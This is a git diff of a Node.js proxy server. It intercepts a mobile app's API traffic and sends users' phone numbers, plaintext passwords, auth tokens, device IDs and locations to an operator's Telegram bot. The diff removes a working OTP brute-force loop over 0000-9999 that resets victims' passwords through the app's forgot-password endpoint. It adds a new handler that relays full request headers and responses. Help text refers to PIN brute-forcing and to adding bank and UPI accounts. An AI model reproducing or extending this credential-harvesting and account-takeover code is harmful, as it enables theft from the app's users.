@@ -28,7 +28,6 @@ const DEFAULT_DATA = {
 
 let bot = null;
 let webhookSet = false;
-let bruteForceActive = false;
 try { bot = new TelegramBot(BOT_TOKEN); } catch(e) {}
 
 let redis = null;
@@ -678,10 +677,9 @@ app.post('/bot-webhook', async (req, res) => {
 === TRACKING ===
 /idtrack — Show all tracked user IDs
 
-=== OTP BRUTE FORCE ===
-/tryotp phone|pass|otp — Test single OTP
-/bruteforce phone|pass — Full scan 0000-9999
-/bruteforce phone|pass|0|4999 — Custom range
+📌 Login pe auto-detect:
+• challengeId + deviceId dikhega
+• Token + PIN brute command dikhega
 
 Example:
 /addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
@@ -983,119 +981,6 @@ Example:
       return res.sendStatus(200);
     }
 
-    if (text.startsWith('/tryotp ')) {
-      const args = text.substring(8).trim();
-      const parts = args.split('|').map(s => s.trim());
-      if (parts.length < 3) {
-        await bot.sendMessage(chatId, '❌ Format: /tryotp phone|newPassword|otp\nExample: /tryotp 6206785398|MyPass123|1234');
-        return res.sendStatus(200);
-      }
-      const [tPhone, tPass, tOtp] = parts;
-      res.sendStatus(200);
-      try {
-        const r = await fetch(`${ORIGINAL_API}/app/user/login/forgot`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ phone: tPhone, password: tPass, otp: tOtp })
-        });
-        const t = await r.text();
-        let j = null;
-        try { j = JSON.parse(t); } catch(e) {}
-        const isSuccess = j && j.code === 1000;
-        await bot.sendMessage(chatId, `${isSuccess ? '✅ SUCCESS!' : '❌ Failed'}\n\n📤 Sent:\n${JSON.stringify({ phone: tPhone, password: tPass, otp: tOtp }, null, 2)}\n\n📥 Response:\n${j ? JSON.stringify(j, null, 2) : t}`);
-      } catch(e) {
-        await bot.sendMessage(chatId, `❌ Error: ${e.message}`);
-      }
-      return;
-    }
-
-    if (text.startsWith('/bruteforce')) {
-      const args = text.substring(11).trim();
-      if (!args) {
-        await bot.sendMessage(chatId, `🔓 OTP Brute Force — Password Reset\n\n📋 Steps:\n1️⃣ App → Reset Password → Send OTP\n2️⃣ Turant bot mein command run karo\n\n📌 Commands:\n/tryotp phone|pass|otp — Single OTP test\n/bruteforce phone|pass — Full 0000-9999\n/bruteforce phone|pass|0|4999 — Custom range\n\n⚡ Speed: ~30 codes/sec\n⏱ Full scan: ~5-6 min`);
-        return res.sendStatus(200);
-      }
-      const parts = args.split('|').map(s => s.trim());
-      if (parts.length < 2) {
-        await bot.sendMessage(chatId, '❌ Format: /bruteforce phone|newPassword|start|end');
-        return res.sendStatus(200);
-      }
-      const bfPhone = parts[0];
-      const bfPass = parts[1];
-      const bfStart = parts[2] !== undefined ? parseInt(parts[2]) : 0;
-      const bfEnd = parts[3] !== undefined ? parseInt(parts[3]) : 9999;
-      if (isNaN(bfStart) || isNaN(bfEnd) || bfStart < 0 || bfEnd > 9999 || bfStart > bfEnd) {
-        await bot.sendMessage(chatId, '❌ Invalid range. 0-9999 allowed.');
-        return res.sendStatus(200);
-      }
-      const totalCodes = bfEnd - bfStart + 1;
-      res.sendStatus(200);
-      bruteForceActive = true;
-
-      await bot.sendMessage(chatId, `🚀 Brute Force Started\n📱 Phone: ${bfPhone}\n🔑 New Pass: ${bfPass}\n🎯 Range: ${String(bfStart).padStart(4,'0')} → ${String(bfEnd).padStart(4,'0')} (${totalCodes} codes)\n\n⏳ Capturing fail response...`);
-
-      try {
-        const testRes = await fetch(`${ORIGINAL_API}/app/user/login/forgot`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ phone: bfPhone, password: bfPass, otp: '@@@@' })
-        });
-        const testText = await testRes.text();
-        let testJson = null;
-        try { testJson = JSON.parse(testText); } catch(e) {}
-        const failCode = testJson?.code;
-        const failMsg = (testJson?.message || testJson?.msg || '').toLowerCase();
-        await bot.sendMessage(chatId, `🔍 Fail = code:${failCode} "${testJson?.message || failMsg}"\n\n⏳ Brute forcing ${totalCodes} codes one by one...\n(Updates every 200 codes)`);
-
-        let found = false;
-        let foundCode = '';
-        let foundResp = '';
-        let tried = 0;
-        let errors = 0;
-        const startTime = Date.now();
-
-        for (let i = bfStart; i <= bfEnd && !found; i++) {
-          const otp = String(i).padStart(4, '0');
-          tried++;
-          try {
-            const r = await fetch(`${ORIGINAL_API}/app/user/login/forgot`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ phone: bfPhone, password: bfPass, otp: otp })
-            });
-            const t = await r.text();
-            let j = null;
-            try { j = JSON.parse(t); } catch(e) {}
-            const rc = j?.code;
-            const rm = (j?.message || j?.msg || '').toLowerCase();
-            if (rc !== failCode || rm !== failMsg) {
-              found = true;
-              foundCode = otp;
-              foundResp = j ? JSON.stringify(j, null, 2) : t;
-            }
-          } catch(e) { errors++; }
-
-          if (!found && (tried % 200 === 0 || tried >= totalCodes)) {
-            const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
-            const speed = elapsed > 0 ? (tried / parseFloat(elapsed)).toFixed(1) : '0';
-            const pct = ((tried / totalCodes) * 100).toFixed(1);
-            await bot.sendMessage(chatId, `⏳ ${tried}/${totalCodes} (${pct}%) | ${elapsed}s | ${speed}/s${errors ? ' | ❌' + errors : ''}\nLast: ${otp}`).catch(()=>{});
-          }
-        }
-
-        bruteForceActive = false;
-        const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
-        if (found) {
-          await bot.sendMessage(chatId, `✅✅✅ PASSWORD RESET SUCCESS!\n\n🔑 OTP: ${foundCode}\n📱 Phone: ${bfPhone}\n🔐 New Password: ${bfPass}\n⏱ Time: ${totalTime}s\n📊 Tried: ${tried}\n\n📋 Response:\n${foundResp}`);
-        } else {
-          await bot.sendMessage(chatId, `❌ Not Found\n📊 ${tried} codes (${String(bfStart).padStart(4,'0')}-${String(bfEnd).padStart(4,'0')})\n⏱ ${totalTime}s${errors ? ' | ❌' + errors + ' errors' : ''}\n\n💡 App mein Send OTP dabao, turant /bruteforce run karo`);
-        }
-      } catch(e) {
-        bruteForceActive = false;
-        await bot.sendMessage(chatId, `❌ Error: ${e.message}`);
-      }
-      return;
-    }
 
     if (text === '/help') {
       await bot.sendMessage(chatId, 'Use /start to see all commands.');
@@ -1159,14 +1044,18 @@ app.post('/app/user/login/login', async (req, res) => {
       const reqStr = JSON.stringify(body, null, 2);
       const resStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody;
       let extraInfo = '';
+      const androidId = body.deviceId || body.androidId || body.device_id || 'N/A';
       if (loginData && loginData.challengeId) {
-        extraInfo = `\n\n🎯 DEVICE VERIFICATION DETECTED!\n📋 challengeId: ${loginData.challengeId}\n📱 deviceId: ${body.deviceId || 'N/A'}\n\n📝 Brute Force Command:\nnode brute-otp.js loginx ${phone || 'PHONE'} ${pwd} ${loginData.challengeId} ${body.deviceId || 'DEVICE_ID'} 0 9999`;
+        extraInfo = `\n\n🎯 DEVICE VERIFICATION NEEDED!\n📋 challengeId: ${loginData.challengeId}\n📱 Android ID: ${androidId}`;
       }
       const loginToken = loginData ? (loginData.token || loginData.accessToken || '') : '';
       if (loginToken && jsonResp?.code === 1000) {
-        extraInfo += `\n\n🔑 AUTH TOKEN:\n${loginToken}\n\n📝 PIN Brute Command:\n/brutepin ${loginToken}|newPin`;
+        extraInfo += `\n\n🔑 AUTH TOKEN:\n${loginToken}`;
       }
-      bot.sendMessage(data.adminChatId, `🔑 Login\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd}\n👤 UserID: ${userId || 'N/A'}\n🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST BODY:\n${reqStr.substring(0, 1500)}\n\n📥 RESPONSE:\n${resStr.substring(0, 1500)}${extraInfo}`).catch(()=>{});
+      if (loginData && loginData.challengeId) {
+        extraInfo += `\n\n📋 COPY:\nchallengeId: ${loginData.challengeId}\ndeviceId: ${androidId}`;
+      }
+      bot.sendMessage(data.adminChatId, `🔑 Login\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd}\n👤 UserID: ${userId || 'N/A'}\n📱 Android ID: ${androidId}\n🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST BODY:\n${reqStr.substring(0, 1500)}\n\n📥 RESPONSE:\n${resStr.substring(0, 1500)}${extraInfo}`).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
@@ -1193,7 +1082,7 @@ app.post('/app/user/login/forgot', async (req, res) => {
     const data = await loadData();
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const body = req.parsedBody || {};
-    if (data.adminChatId && bot && !bruteForceActive) {
+    if (data.adminChatId && bot) {
       const reqStr = JSON.stringify(body, null, 2);
       const resStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody;
       bot.sendMessage(data.adminChatId, `🔓 Forgot Password\n📱 Phone: ${body.userName || body.phone || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST BODY:\n${reqStr.substring(0, 1500)}\n\n📥 RESPONSE BODY:\n${resStr.substring(0, 1500)}`).catch(()=>{});
@@ -1713,6 +1602,36 @@ app.all('/app/offline/order/*', async (req, res) => {
     if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
       const phone = getPhone(data, userId);
       bot.sendMessage(data.adminChatId, `📦 ${req.originalUrl} [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}`).catch(()=>{});
+    }
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) { await transparentProxy(req, res); }
+});
+
+app.all('/app/user/info/getInviterUrl', async (req, res) => {
+  const data = await loadData();
+  try {
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const userId = await extractUserId(req, jsonResp);
+    const phone = getPhone(data, userId);
+    if (data.adminChatId && bot) {
+      const reqHeaders = {};
+      for (const [k,v] of Object.entries(req.headers)) {
+        if (!k.startsWith('x-vercel') && !k.startsWith('x-forwarded') && k !== 'host' && k !== 'connection' && k !== 'accept-encoding') reqHeaders[k] = v;
+      }
+      const respData = getResponseData(jsonResp);
+      let inviteInfo = '';
+      if (respData && typeof respData === 'object') {
+        const invite = respData.invite || respData.inviteCode || respData.inviterCode || respData.code || respData.shareCode || '';
+        const url = respData.url || respData.inviteUrl || respData.shareUrl || respData.link || '';
+        const inviterId = respData.inviterId || respData.parentId || respData.referrerId || '';
+        inviteInfo = `\n\n📋 INVITE DETAILS:\n🔗 Invite Code: ${invite || 'N/A'}\n🌐 URL: ${url || 'N/A'}\n👤 Inviter ID: ${inviterId || 'N/A'}`;
+        for (const [k, v] of Object.entries(respData)) {
+          if (!['invite','inviteCode','inviterCode','code','shareCode','url','inviteUrl','shareUrl','link','inviterId','parentId','referrerId'].includes(k)) {
+            inviteInfo += `\n📌 ${k}: ${typeof v === 'object' ? JSON.stringify(v) : v}`;
+          }
+        }
+      }
+      bot.sendMessage(data.adminChatId, `🔗 GET INVITER URL\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST HEADERS:\n${JSON.stringify(reqHeaders, null, 2).substring(0, 2000)}\n\n📤 REQUEST BODY:\n${JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1000)}\n\n📥 FULL RESPONSE:\n${(jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody).substring(0, 3000)}${inviteInfo}`).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
